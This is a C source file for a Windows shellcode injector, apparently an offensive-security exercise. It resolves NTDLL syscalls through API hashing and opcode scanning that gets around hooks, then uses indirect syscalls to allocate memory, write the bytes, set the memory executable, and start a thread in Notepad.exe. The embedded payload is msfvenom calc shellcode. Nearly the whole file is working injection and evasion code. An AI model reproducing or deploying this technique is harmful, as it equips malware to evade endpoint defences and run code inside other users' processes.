#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <ctype.h>
#include <TlHelp32.h>
#include <stdlib.h>
#include <intrin.h>
#include "structs.h"

// disable error 4996 (caused by sprint)
#pragma warning (disable:4996)

// locates process pid by name
int LocateTarget(const char* targetProcName) {
	// Create a snapshot of all processes in the system
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) {
		printf("Failed to create process snapshot. Error: %lu", GetLastError());
		return -1;
	}

	PROCESSENTRY32 proc;
	proc.dwSize = sizeof(PROCESSENTRY32);
	BOOL result = Process32First(snapshot, &proc);
	if (result == FALSE) {
		wprintf(L"Failed to get first process. Error: %lu", GetLastError());
		CloseHandle(snapshot);
		return -1;
	}

	WCHAR targetProcNameW[MAX_PATH];
	mbstowcs_s(NULL, targetProcNameW, MAX_PATH, targetProcName, _TRUNCATE); // convert the target process name to wide char

	while (result) {
		// check the process name
		//wprintf(L"Checking process: %s with PID: %lu\n", proc.szExeFile, proc.th32ProcessID);
		if (wcscmp(proc.szExeFile, targetProcNameW) == 0) {
			wprintf(L"Found target process: %s with PID: %lu\n", proc.szExeFile, proc.th32ProcessID);
			HANDLE hTargetProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, proc.th32ProcessID);
			if (hTargetProc == NULL) {
				printf("Failed to open target process. Error: %lu", GetLastError());
				CloseHandle(snapshot);
				return -1;
			}
			return proc.th32ProcessID;

			CloseHandle(hTargetProc);
		}
		result = Process32Next(snapshot, &proc);
	}
	CloseHandle(snapshot);
	return -1;
}

// String Hashing algorithm
#define INITIAL_SEED	7
UINT32 HashStringJenkinsOneAtATime32BitA(PCHAR String)
{
	SIZE_T Index = 0;
	UINT32 Hash = 0;
	SIZE_T Length = lstrlenA(String);

	while (Index != Length)
	{
		CHAR c = String[Index++];

		c = (CHAR)tolower((unsigned char)c);

		Hash += (UINT8)c;
		Hash += Hash << INITIAL_SEED;
		Hash ^= Hash >> 6;
	}

	Hash += Hash << 3;
	Hash ^= Hash >> 11;
	Hash += Hash << 15;

	return Hash;
}
#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))


PSYSCALL_TABLE InitSyscallTable(void)
{
	PSYSCALL_TABLE Table = HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,sizeof(SYSCALL_TABLE));

	if (Table == NULL)
		return NULL;

	Table->TableHead = NULL;

	return Table;
}

// Adds a syscall entry struct to the table
BOOL AddSyscallTableEntry(PSYSCALL_TABLE Table, PVOID SyscallFuncAddr, PVOID SyscallInstrAddr, UINT32 SysHash, WORD SyscallSsn) {

	if (Table == NULL || SyscallFuncAddr == NULL || SysHash == 0 || SyscallSsn == 0 || SyscallInstrAddr == NULL) {
		return FALSE;
	}

	// Create the new syscall entry
	PSYSCALL_TABLE_ENTRY NewSyscall = HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,sizeof(SYSCALL_TABLE_ENTRY));
	if (NewSyscall == NULL)
		return FALSE;

	NewSyscall->Hash = SysHash;
	NewSyscall->pFuncAddress = SyscallFuncAddr;
	NewSyscall->pInstrAddress = SyscallInstrAddr;
	NewSyscall->SyscallSsn = SyscallSsn;
	NewSyscall->NextSyscall = NULL;

	if (Table->TableHead == NULL)
	{
		Table->TableHead = NewSyscall;
		return TRUE;
	}

	PSYSCALL_TABLE_ENTRY CurrSyscall = Table->TableHead;
	while (CurrSyscall->NextSyscall != NULL)
	{
		CurrSyscall = CurrSyscall->NextSyscall;
	}

	CurrSyscall->NextSyscall = NewSyscall;
	return TRUE;
}

// Find and creates new syscall entry for a given syscall
BOOL CreateSyscallEntry(UINT32 SyscallNameHash, PSYSCALL_TABLE Table) {

	HMODULE hModule = GetModuleHandleW(L"NTDLL.DLL");
	PVOID SyscallFuncAddress = NULL, SyscallInstrAddress = NULL;
	WORD SyscallSsn;

	if (hModule == NULL || SyscallNameHash == NULL || Table == NULL)
		return NULL;

	// Getting NTDLL export table and functions name,ordinal and address arrays
	PBYTE pDllBase = (PBYTE)hModule;
	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pDllBase;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
		return NULL;
	}

	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pDllBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
		return NULL;
	}

	IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;
	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pDllBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	PDWORD FunctionNameArray = (PDWORD)(pDllBase + pImgExportDir->AddressOfNames);
	PWORD FunctionOrdinalArray = (PWORD)(pDllBase + pImgExportDir->AddressOfNameOrdinals);
	PDWORD FunctionAddressArray = (PDWORD)(pDllBase + pImgExportDir->AddressOfFunctions);

	// finding the wanted syscall by its hash
	for (DWORD i = 0; i < pImgExportDir->NumberOfNames; i++) {

		CHAR* pFunctionName = (CHAR*)(pDllBase + FunctionNameArray[i]);
		PVOID pFunctionAddress = (PVOID)(pDllBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

		if (SyscallNameHash == HASHA(pFunctionName)) {
			SyscallFuncAddress = pFunctionAddress;

			DWORD offset = 0; // offset in the syscall function if it has been hooked
			BOOL foundInstr = FALSE, foundSsn = FALSE;

			while (offset <=0xF8 && !(foundInstr && foundSsn)) {

				// check if ret, in this case we are also probably too far
				if (*((PBYTE)pFunctionAddress + offset) == 0xc3) {
					return FALSE;
				}

				// check if syscall
				if (*((PBYTE)pFunctionAddress + offset) == 0x0f && *((PBYTE)pFunctionAddress + offset + 1) == 0x05) {
					SyscallInstrAddress = (PBYTE)pFunctionAddress + offset;
					foundInstr = TRUE;
				}

				// First opcodes should be :
				// MOV R10, RCX
				// MOV EAX, <syscall>
				if (*((PBYTE)pFunctionAddress + offset) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + offset) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + offset) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + offset) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + offset) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + offset) == 0x00) {

					BYTE high = *((PBYTE)pFunctionAddress + 5 + offset);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + offset);

					SyscallSsn = (high << 8) | low;
					foundSsn = TRUE;
				}
				offset++;
			}

			// We couldnt find the correct SSN or syscall instruction address
			if (!foundInstr || !foundSsn)
				return FALSE;

			printf("[+] Found %s with SSN %u at %p\n", pFunctionName, SyscallSsn, SyscallFuncAddress);

			if (!AddSyscallTableEntry(Table, SyscallFuncAddress,SyscallInstrAddress, SyscallNameHash, SyscallSsn))
				return FALSE;

			return TRUE;
		}
	}
	return FALSE;
}

// Gets an entry from the table by hash
PSYSCALL_TABLE_ENTRY GetSyscallEntry(PSYSCALL_TABLE Table, UINT32 SyscallHash) {
	PSYSCALL_TABLE_ENTRY CurrSyscall = Table->TableHead;
	while (CurrSyscall != NULL) {
		if (CurrSyscall->Hash == SyscallHash) {
			return CurrSyscall;
		}
		CurrSyscall = CurrSyscall->NextSyscall;
	}
	return NULL;
}

// The extrnal assembly function 
extern NTSTATUS DynamicSyscallDispatcher(CALL_CONTEXT* Context, SYSCALL_TABLE_ENTRY* SyscallTarget);

// The main function that preforms indirect syscall calling
NTSTATUS IndirectSyscall(PSYSCALL_TABLE Table, UINT32 SyscallHash, CALL_CONTEXT* ctx) {
	PSYSCALL_TABLE_ENTRY SyscallEntry = GetSyscallEntry(Table, SyscallHash);
	if (SyscallEntry == NULL) {
		printf("[x] Couldnt find the Syscall entry");
		return FALSE;
	}

	NTSTATUS status = DynamicSyscallDispatcher(ctx, SyscallEntry);
	return status;
}

void PrintSyscallTable(PSYSCALL_TABLE Table)
{
	if (Table == NULL)
	{
		printf("[-] Table is NULL\n");
		return;
	}

	PSYSCALL_TABLE_ENTRY Current = Table->TableHead;
	int Index = 0;

	printf("\n========== SYSCALL TABLE ==========\n");

	while (Current != NULL)
	{
		printf("\n[Entry %d]\n", Index);
		printf("  Address      : %p\n", (void*)Current);
		printf("  FuncAddress  : %p\n", Current->pFuncAddress);
		printf("  InstrAddress : %p\n", Current->pInstrAddress);
		printf("  Hash         : 0x%08X\n", Current->Hash);
		printf("  Syscall SSN  : %u\n", (unsigned int)Current->SyscallSsn);
		printf("  Next         : %p\n", (void*)Current->NextSyscall);

		Current = Current->NextSyscall;
		Index++;
	}

	printf("\n===================================\n");
}


VOID DebugPrint(PCALL_CONTEXT Ctx)
{
	if (Ctx == NULL)
	{
		printf("[-] CALL_CONTEXT is NULL\n");
		return;
	}

	printf("\n========== CALL CONTEXT ==========\n");
	printf("ArgumentCount: %lu\n", (unsigned long)Ctx->ArgumentCount);

	if (Ctx->ArgumentCount > 16)
	{
		printf("[-] Invalid ArgumentCount: %lu\n",
			(unsigned long)Ctx->ArgumentCount);
		return;
	}

	for (DWORD i = 0; i < Ctx->ArgumentCount; i++)
	{
		printf("Argument[%lu]: 0x%016llX\n",
			(unsigned long)i,
			(unsigned long long)Ctx->Arguments[i]);
	}

	printf("==================================\n");
}

// main injection function
BOOL InjectRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T SizeOfShellcode) {

	// Init and populate structs for the syscall data
	PSYSCALL_TABLE Table = InitSyscallTable();
	if (!(CreateSyscallEntry(HASHA("NtAllocateVirtualMemory"), Table)
		&& CreateSyscallEntry(HASHA("NtWriteVirtualMemory"), Table)
		&& CreateSyscallEntry(HASHA("NtProtectVirtualMemory"), Table)
		&& CreateSyscallEntry(HASHA("NtCreateThreadEx"), Table))) {
		return FALSE;
	}

	PCALL_CONTEXT AllocateMemCtx = (PCALL_CONTEXT)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(CALL_CONTEXT));
	PCALL_CONTEXT WriteMemCtx = (PCALL_CONTEXT)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(CALL_CONTEXT));
	PCALL_CONTEXT ProtectMemCtx = (PCALL_CONTEXT)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(CALL_CONTEXT));
	PCALL_CONTEXT CreateThreadCtx = (PCALL_CONTEXT)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(CALL_CONTEXT));

	if (AllocateMemCtx == NULL || WriteMemCtx == NULL || ProtectMemCtx == NULL || CreateThreadCtx == NULL)
		return FALSE;

	// Indirect syscall to NtAllocateVirtualMemory
	PVOID pMemAddress = NULL;
	SIZE_T RegionSize = SizeOfShellcode;  
	AllocateMemCtx->ArgumentCount = 6;
	AllocateMemCtx->Arguments[0] = (UINT64)hProcess;
	AllocateMemCtx->Arguments[1] = (UINT64)&pMemAddress;
	AllocateMemCtx->Arguments[2] = (UINT64)0;
	AllocateMemCtx->Arguments[3] = (UINT64)&RegionSize;
	AllocateMemCtx->Arguments[4] = (UINT64)(MEM_COMMIT | MEM_RESERVE);
	AllocateMemCtx->Arguments[5] = (UINT64)(PAGE_READWRITE);

	NTSTATUS status = IndirectSyscall(Table, HASHA("NtAllocateVirtualMemory"), AllocateMemCtx);
	if (status != 0) {
		printf("[-] NtAllocateVirtualMemory Failed: 0x%08X\n",status);
		DebugPrint(AllocateMemCtx);
		return FALSE;
	}
	printf("[+] Allocated Address At : 0x%p Of Size : %zu \n", pMemAddress, SizeOfShellcode);


	// Indirect syscall to NtWriteVirtualMemory
	SIZE_T NumberOfBytesWritten = NULL;
	WriteMemCtx->ArgumentCount = 5;
	WriteMemCtx->Arguments[0] = (UINT64)hProcess;
	WriteMemCtx->Arguments[1] = (UINT64)pMemAddress;
	WriteMemCtx->Arguments[2] = (UINT64)pShellcode;
	WriteMemCtx->Arguments[3] = (UINT64)SizeOfShellcode;
	WriteMemCtx->Arguments[4] = (UINT64)&NumberOfBytesWritten;

	status = IndirectSyscall(Table, HASHA("NtWriteVirtualMemory"), WriteMemCtx);
	if (status != 0) {
		printf("[-] NtWriteVirtualMemory Failed: 0x%08X\n", status);
		DebugPrint(WriteMemCtx);
		return FALSE;
	}
	printf("[i] Bytes Written : %zu of %zu \n", NumberOfBytesWritten, SizeOfShellcode);


	// Indirect syscall to NtProtectVirtualMemory
	ULONG OldProtection = NULL;
	ProtectMemCtx->ArgumentCount = 5;
	ProtectMemCtx->Arguments[0] = (UINT64)hProcess;
	ProtectMemCtx->Arguments[1] = (UINT64)&pMemAddress;
	ProtectMemCtx->Arguments[2] = (UINT64)&SizeOfShellcode;
	ProtectMemCtx->Arguments[3] = (UINT64)(PAGE_EXECUTE_READWRITE);
	ProtectMemCtx->Arguments[4] = (UINT64)&OldProtection;

	status = IndirectSyscall(Table, HASHA("NtProtectVirtualMemory"), ProtectMemCtx);
	if (status != 0) {
		printf("[-] NtProtectVirtualMemory Failed: 0x%08X\n", status);
		DebugPrint(ProtectMemCtx);
		return FALSE;
	}


	// Indirect syscall to NtCreateThreadEx
	HANDLE hThread = NULL;
	CreateThreadCtx->ArgumentCount = 11;
	CreateThreadCtx->Arguments[0] = (UINT64)&hThread;
	CreateThreadCtx->Arguments[1] = (UINT64)(THREAD_ALL_ACCESS);
	CreateThreadCtx->Arguments[2] = (UINT64)NULL;
	CreateThreadCtx->Arguments[3] = (UINT64)hProcess;
	CreateThreadCtx->Arguments[4] = (UINT64)pMemAddress;
	CreateThreadCtx->Arguments[5] = (UINT64)NULL;
	CreateThreadCtx->Arguments[6] = (UINT64)NULL;
	CreateThreadCtx->Arguments[7] = (UINT64)NULL;
	CreateThreadCtx->Arguments[8] = (UINT64)NULL;
	CreateThreadCtx->Arguments[9] = (UINT64)NULL;
	CreateThreadCtx->Arguments[10] = (UINT64)NULL;
	CreateThreadCtx->Arguments[11] = (UINT64)NULL;

	printf("\t[i] Running Thread Of Entry 0x%p ... ", pMemAddress);
	status = IndirectSyscall(Table, HASHA("NtCreateThreadEx"), CreateThreadCtx);
	if (status != 0) {
		printf("[-] NtCreateThreadEx Failed: 0x%08X\n", status);
		DebugPrint(CreateThreadCtx);
		return FALSE;
	}
	printf("[+] DONE \n");
	printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));

	return TRUE;

}
		

int main() {
	// msfvenom x64 calc payload
	unsigned char Payload[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
	};

	const char* TargetProcName = "Notepad.exe";
	DWORD TargetPID = (DWORD)LocateTarget(TargetProcName);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetPID);
	if (hProcess == NULL) {
		printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());
		return -1;
	}

	if (!InjectRemoteProcess(hProcess, (PBYTE)Payload, sizeof(Payload))) {
		printf("[!] Injecting Process Failed");
		return -1;
	}
	printf("[+] DONE\n");
	return 0;

}